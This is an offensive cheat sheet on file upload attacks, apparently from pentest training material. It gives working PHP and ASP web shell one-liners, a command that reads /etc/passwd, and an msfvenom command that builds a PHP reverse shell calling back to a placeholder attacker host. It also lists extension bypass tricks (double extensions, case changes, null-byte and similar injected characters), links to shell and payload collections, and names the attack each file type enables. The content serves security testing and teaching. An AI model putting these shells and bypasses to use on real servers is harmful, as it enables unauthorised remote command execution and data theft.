title: File Upload Attacks
html:
File Upload Attacks

Web Shells

Description

**Web Shell**

Basic PHP File Read

<?php file_get_contents('/etc/passwd'); ?>

Basic PHP Command Execution

<?php system('hostname'); ?>

Basic PHP Web Shell

<?php system($_REQUEST['cmd']); ?>

Basic ASP Web Shell

<% eval request('cmd') %>

Generate PHP reverse shell

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

PHP Web Shell

[PHP Web Shell](https://github.com/Arrexel/phpbash)

PHP Reverse Shell

[PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

List of Web Shells and Reverse Shells

[Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

Bypasses

Toggle Page Inspector

[CTRL+SHIFT+C]

Uncommon Extension

shell.phtml

Case Manipulation

shell.pHp

List of PHP Extensions

[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)

List of ASP Extensions

[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)

List of Web Extensions

[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

Double Extension

shell.jpg.php

Reverse Double Extension

shell.php.jpg

Character Injection - Before/After Extension

`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`

Limited Uploads

File Types

**Potential Attack**

HTML, JS, SVG, GIF

XSS

XML, SVG, PDF, PPT, DOC

`XXE`/`SSRF`

ZIP, JPG, PNG

DoS
